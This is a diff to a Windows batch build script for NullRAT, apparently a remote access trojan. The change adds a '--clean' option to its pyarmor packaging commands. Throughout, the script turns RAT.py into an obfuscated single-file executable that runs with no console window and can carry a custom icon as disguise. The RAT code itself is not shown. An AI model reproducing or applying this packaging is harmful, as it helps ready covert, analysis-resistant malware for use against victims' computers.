@@ -17,13 +17,13 @@ exit /b 1
 :non_icon_compile
 echo. & echo Compiling NullRAT...
 echo -------------------- & echo.
-pyarmor pack -e "--onefile --noconsole" RAT.py & cls 
+pyarmor pack --clean -e "--onefile --noconsole" RAT.py & cls 
 cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\ & rmdir /s /q dist\
 if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
 
 :icon_compile
 echo. & echo Compiling NullRAT with icon...
 echo ------------------------------ & echo.
-pyarmor pack -e "--onefile --icon=custom_icon.ico --noconsole" RAT.py 
+pyarmor pack --clean -e "--onefile --icon=custom_icon.ico --noconsole" RAT.py 
 cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\ & rmdir /s /q dist\
 if %errorlevel% == 0 (cls & echo Successfully compiled! & exit /b 0) else (cls & echo Not compiled successfully :[ & echo. & pause & exit /b 1)
